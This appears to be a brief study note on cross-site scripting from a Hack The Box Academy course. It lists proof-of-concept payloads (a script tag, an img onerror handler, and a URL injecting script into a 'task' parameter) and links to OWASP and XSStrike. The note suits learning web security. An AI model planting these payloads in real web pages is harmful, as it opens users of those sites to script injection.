# XSS

```html
<script>
  alert(window.origin);
</script>
```

```html
<div></div>
<ul class="list-unstyled" id="todo">
  <div style="padding-left:25px">
    Task '
    <script>
      alert(window.origin);
    </script>
    ' could not be added.
  </div>
</ul>
```

```url
http://SERVER_IP:PORT/index.php?task=<script>alert(window.origin)</script>
```

```html
<img src="" onerror="alert(window.origin)" />
```

[Owasps xss cheat sheet](https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet).
[XSStrike](https://github.com/s0md3v/XSStrike).
[HTB](https://academy.hackthebox.com/module/103/section/982)
